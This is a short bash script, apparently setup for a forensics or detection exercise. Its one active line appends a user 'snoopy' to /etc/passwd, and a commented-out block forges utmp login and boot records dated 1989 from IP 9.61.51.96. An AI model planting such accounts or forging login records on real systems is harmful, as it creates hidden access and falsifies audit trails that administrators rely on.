#!/bin/bash
#
# Target format
#
#[2] [00000] [~~  ] [reboot  ] [~           ] [4.18.0-513.11.1.el8_9.x86_64] [0.0.0.0        ] [2024-01-23T16:46:43,332241+00:00]
#[1] [00051] [~~  ] [runlevel] [~           ] [4.18.0-513.11.1.el8_9.x86_64] [0.0.0.0        ] [2024-01-23T16:46:47,148272+00:00]
#[7] [1      ] [ts/0] [snoopy  ] [pts/0       ] [9.61.51.96          ] [9.61.51.96     ] [1989-10-19T19:25:19,096942+00:00]
#

#
# Fetch:
#   - current boot time in UTC format
#   - current kernel version
#
# 2025-feb-21: use mounted /var instead
#
#d=$(date -u --date=@$(date "+%s" --date="$(uptime -s)") +"%Y-%m-%dT%T")
#u=$(uname -r)
#
#(
#    printf  "[2] [00000] [~~  ] [reboot  ] [~           ] [%s] [0.0.0.0        ] [%s,332241+00:00]\n" $u $d
#    printf  "[1] [00051] [~~  ] [runlevel] [~           ] [%s] [0.0.0.0        ] [%s,148272+00:00]\n" $u $d
#    printf  "[7] [1      ] [ts/0] [snoopy  ] [pts/0       ] [9.61.51.96          ] [9.61.51.96     ] [1989-11-19T19:25:19,096942+00:00]\n"
#) | utmpdump -r > /var/run/utmp 2>/dev/null
#

echo 'snoopy:x:1001:1001::/home/snoopy:/bin/bash' >> /etc/passwd

